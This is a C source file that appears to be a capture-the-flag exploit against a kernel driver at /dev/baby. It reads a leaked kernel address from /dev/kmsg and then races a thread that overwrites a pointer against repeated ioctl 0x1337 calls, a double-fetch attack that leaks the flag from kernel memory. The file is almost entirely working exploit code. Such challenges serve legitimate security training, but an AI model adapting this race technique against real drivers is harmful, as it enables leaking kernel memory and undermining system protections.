#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pthread.h>

#define MAXSIZE 1024
#define MAXTIME 1000000

unsigned long target_addr;
int finish;
typedef struct 
{
	char* flag_addr;
	unsigned long flag_len;
}data, *pdata;
data data_flag;
int fd;

void *
rewrite_flag_addr(void *arg)
{
	pdata data = (pdata)arg;
	while(finish == 0)
	{
		data->flag_addr = (char *)target_addr;
		//printf("%p\n",data_flag.flag_addr);
	}
}


int main()
{
	fd = open("/dev/baby", O_RDWR);
	__asm(
		".intel_syntax noprefix;"
		"mov rax, 0x10;"
		"mov rdi, fd;"
		"mov rsi, 0x6666;"
		"syscall;"
		".att_syntax;"
	);	
	
	char buf[MAXSIZE];
	char *target;
	int count;
	int flag = open("/dev/kmsg", O_RDONLY);
	if (flag == -1)
		printf("open dmesg error");
	while ((count = read(flag, buf, MAXSIZE)) > 0)
	{
		if ((target = strstr(buf, "Your flag is at ")) > 0)
		{
			target = target + strlen("Your flag is at ");
			char *temp = strstr(target, "!");
			target[temp - target] = 0;
			target_addr = strtoul(target, NULL, 16);
			printf("flag address:0x%s\n",target);
			printf("flag address:0x%lx\n", target_addr);
			break;
		}
	}
/*	
	__asm(
		".intel_syntax noprefix;"
		"mov rax, 0x10;"
		"mov rdi, fd;"
		"mov rsi, 0x1337;"
		"mov rdx, 0x20;"
		"syscall;"
		".att_syntax;"
	);

*/	
	data_flag.flag_addr = buf;
	data_flag.flag_len = 33;
	pthread_t ntid;
	int err;
	err = pthread_create(&ntid, NULL, rewrite_flag_addr, &data_flag);	
	for (int i = 0; i < MAXTIME; i++)
	{
		ioctl(fd, 0x1337, &data_flag);
		data_flag.flag_addr = buf;
		//printf("%d\n",i);
	}
	finish = 1;
	pthread_join(ntid, NULL);
	printf("end!");
	//system("dmesg | grep flag");
}
